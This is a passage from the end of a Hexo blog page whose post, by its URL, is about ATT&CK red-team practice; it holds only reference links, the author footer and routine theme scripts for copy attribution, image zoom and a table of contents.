<p>参考链接：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/vege/p/14021537.html">https://www.cnblogs.com/vege/p/14021537.html</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/yvr9kt/gdp94e/9ae5c0688b17c1a71c6f96c8c9f6bbb2">https://www.yuque.com/yvr9kt/gdp94e/9ae5c0688b17c1a71c6f96c8c9f6bbb2</a></p>

      </div>
    </div>
</div>


<div class="post-footer">
  

  <div class="post-copyright">
    <p style="margin: 5px 0;">文章作者：<a href="/">blckder02</a></p>
    <p style="margin: 5px 0;">文章链接：<a href="http://www.blckder02.cn/2022/09/17/ATT&amp;CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%B8%80)/">http://www.blckder02.cn/2022/09/17/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98(%E4%B8%80)/</a></p>
    <p style="margin: 5px 0;">版权声明：</p>
  </div>
  
</div>

    <!-- Comments -->
    <div class="comments">
        
        
    </div>

</article>


        </div>
        
<footer class="text-center">
    
    
    
    
    
    <p>&copy;  2020 - 2021&nbsp;&nbsp;Theme Miracle</p>
    
    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme by <a href="https://github.com/hifun-team/hexo-theme-miracle" target="_blank">Miracle</a></p>
    
    
</footer>

<div class="p-btn">
    
        <a class="toc-btn" id="toc-btn"><i id="i-menu"></i></a>
    
    <a href="#top" class="click-btn">
      <i id="i-up"></i>
    </a>
</div>

<!-- SCRIPTS -->







<script>
    document.getElementById("btn-dropdown").addEventListener('click', () => {
      toggleClass("#dropdown-menus","display-inline");
    });
    console.log('\n' + ' %c Powered by Hexo Theme Miracle ' + ' %c https://github.com/hifun-team/hexo-theme-miracle ' + '\n' + '\n', 'color: #fff; background: #4F9BFA; padding:5px 0;', 'background: #FFF; padding:5px 0;');

    

    
      document.addEventListener('copy', function (event) {
      const clipboardData = event.clipboardData || window.clipboardData;
      if (!clipboardData) { return; }
      const text = window.getSelection().toString();
      if (text) {
        event.preventDefault();
        clipboardData.setData('text/plain', text + '本文章由 blckder02 撰写，转载请注明来源喔。');
      }
    });
    
  /* 小彩蛋: 饮茶先啦 */
  setTimeout(() => {
    var time = new Date();
    if (time.getHours() == 15) {
      let comment = document.createComment(' 三点几嚟！饮茶先啦！ ');
      document.body.insertBefore(comment, document.getElementsByTagName('header')[0]);
    }
  },1);
    
</script>


<script>
    var postImg = document.querySelectorAll("article[class=page] img");
    for (let imgi = 0; imgi < postImg.length; imgi++) {
        postImg[imgi].onclick = () => {
            let zoomImg = document.createElement("div");
            zoomImg.id = "zoomImg";
            zoomImg.innerHTML = `<div id="zoom-picture"></div>
    <div class="poptrox-overlay"
        style="position: fixed; left: 0px; top: 0px; z-index: 20000; width: 100%; height: 100%; text-align: center; cursor: zoom-out; opacity: 1;">
        <div style="display:inline-block;height:100%;vertical-align:middle;"></div>
        <div
            style="position:absolute;left:0;top:0;width:100%;height:100%;background:#000000;opacity:0;filter:alpha(opacity=0);">
        </div>
        <div class="poptrox-popup"
            style="display: inline-block; vertical-align: middle; position: relative; z-index: 1; cursor: zoom-out; min-width: 10px; min-height: 10px; width: auto; height: auto;">
            <div class="loader" style="display: none;"></div>
            <div class="pic" style="text-indent: 0px;"><img
                    src="${ postImg[imgi].srcset || postImg[imgi].src }" alt="Loading..."
                    style="vertical-align: bottom; max-width: 85vw; max-height: 85vh;"></div>
        </div>
    </div>`;
            document.body.appendChild(zoomImg);
                document.querySelector("#zoomImg").onclick = () => {
                    document.querySelector("#zoomImg").remove();
                }
        }
    }
    
</script>




    <script>
        query("#toc-btn")[0].onclick = () => {
            if (query(".post-toc")[0].innerHTML) {
                toggleClass(".post-toc", "display-inline");
            }
        }

        if (!query(".post-toc")[0].innerHTML) {
            addClass("#toc-btn","display-none");
        }
    </script>









        </div>
        <div id="css-loading">
            <h3 class="text-center">加载中...</h3>
        </div>
        
    </body>
</html>
